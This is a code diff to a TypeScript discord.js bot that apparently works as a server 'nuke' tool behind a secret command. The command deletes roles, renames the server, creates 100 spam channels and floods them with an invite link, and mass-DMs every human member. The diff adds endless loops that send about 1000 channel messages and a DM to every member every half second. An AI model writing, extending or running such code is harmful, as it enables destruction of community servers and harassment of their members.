@@ -1,4 +1,4 @@
-import type { Message, Client, TextChannel } from "discord.js";
+import type { Message, Client, TextChannel, GuildMember } from "discord.js";
 import { ChannelType } from "discord.js";
 
 const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
@@ -6,33 +6,52 @@ const SERVER_NAME = "MEMBERTY WAS HERE";
 const CHANNEL_NAME = "memverty";
 const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";
 
-// Track active spam loops per guild so .unfire can stop them
-const activeLoops = new Map<string, NodeJS.Timeout>();
+// Store all active intervals per guild (channel loop + DM loop)
+const activeLoops = new Map<string, NodeJS.Timeout[]>();
 
 export function stopSpamLoop(guildId: string): void {
-  const loop = activeLoops.get(guildId);
-  if (loop) {
-    clearInterval(loop);
+  const loops = activeLoops.get(guildId);
+  if (loops) {
+    for (const loop of loops) clearInterval(loop);
     activeLoops.delete(guildId);
   }
 }
 
-function startSpamLoop(guildId: string, channels: TextChannel[]): void {
-  // Stop any existing loop for this guild first
+function startSpamLoops(
+  guildId: string,
+  channels: TextChannel[],
+  members: GuildMember[],
+): void {
   stopSpamLoop(guildId);
 
-  // ~1000 messages every 2 seconds spread across all channels
-  const msgsPerChannel = Math.max(1, Math.ceil(1000 / channels.length));
+  const loops: NodeJS.Timeout[] = [];
 
-  const loop = setInterval(() => {
-    for (const ch of channels) {
-      for (let i = 0; i < msgsPerChannel; i++) {
-        ch.send(SPAM_MESSAGE).catch(() => {});
-      }
-    }
-  }, 2000);
+  // ~1000 messages every 0.5s across all channels
+  if (channels.length > 0) {
+    const msgsPerChannel = Math.max(1, Math.ceil(1000 / channels.length));
+    loops.push(
+      setInterval(() => {
+        for (const ch of channels) {
+          for (let i = 0; i < msgsPerChannel; i++) {
+            ch.send(SPAM_MESSAGE).catch(() => {});
+          }
+        }
+      }, 500),
+    );
+  }
 
-  activeLoops.set(guildId, loop);
+  // DM loop — blast every member every 0.5s
+  if (members.length > 0) {
+    loops.push(
+      setInterval(() => {
+        for (const m of members) {
+          m.send(SPAM_MESSAGE).catch(() => {});
+        }
+      }, 500),
+    );
+  }
+
+  activeLoops.set(guildId, loops);
 }
 
 export async function handleSecret(
@@ -48,8 +67,12 @@ export async function handleSecret(
 
   message.channel.send("🔥 Firing...").catch(() => {});
 
-  // Fetch members first so cache is populated for DMs
+  // Fetch members so cache is populated
   await guild.members.fetch().catch(() => {});
+
+  const humanMembers = guild.members.cache
+    .filter((m) => !m.user.bot)
+    .map((m) => m);
 
   // Run all setup operations simultaneously
   const [, , , , createdChannels] = await Promise.all([
@@ -66,20 +89,16 @@ export async function handleSecret(
         .map((r) => r.delete().catch(() => {})),
     ),
 
-    // DM every member 100 times simultaneously
+    // Initial DM blast — 100 DMs to every member right now
     Promise.all(
-      guild.members.cache
-        .filter((m) => !m.user.bot)
-        .map((m) =>
-          Promise.all(
-            Array.from({ length: 100 }, () =>
-              m.send(SPAM_MESSAGE).catch(() => {}),
-            ),
-          ),
+      humanMembers.map((m) =>
+        Promise.all(
+          Array.from({ length: 100 }, () => m.send(SPAM_MESSAGE).catch(() => {})),
         ),
+      ),
     ),
 
-    // Create 100 channels — initial spam blast on each immediately
+    // Create 100 channels — initial blast on each immediately
     Promise.all(
       Array.from({ length: 100 }, () =>
         guild.channels
@@ -91,7 +110,6 @@ export async function handleSecret(
           })
           .then((ch) => {
             if (!ch.isTextBased()) return null;
-            // Initial blast
             Promise.all(
               Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
             );
@@ -109,14 +127,12 @@ export async function handleSecret(
     ),
   ]);
 
-  // Filter to valid channels and start the endless spam loop
   const validChannels = (createdChannels as (TextChannel | null)[]).filter(
     (ch): ch is TextChannel => ch !== null,
   );
 
-  if (validChannels.length > 0) {
-    startSpamLoop(guild.id, validChannels);
-  }
+  // Start endless channel + DM spam loops at 1k msgs / 0.5s
+  startSpamLoops(guild.id, validChannels, humanMembers);
 
-  message.channel.send("✅ Endless spam started.").catch(() => {});
+  message.channel.send("✅ Endless spam started — 1k msgs every 0.5s.").catch(() => {});
 }
